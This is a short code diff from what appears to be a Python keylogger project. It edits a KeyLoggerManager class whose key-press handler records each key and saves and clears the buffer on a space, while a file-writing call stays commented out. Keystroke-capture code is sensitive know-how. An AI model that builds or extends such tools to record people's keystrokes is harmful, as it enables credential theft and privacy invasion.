@@ -89,7 +89,7 @@ class KeyLoggerManager:
     def handle_key_press(self, key):
         self.service.add_key(key)
         if key == Key.space:
-            logs = self.service.save_and_clear()
+            self.service.save_and_clear()
             # self.file_writer.write_to_file(logs)
 
     def start(self):
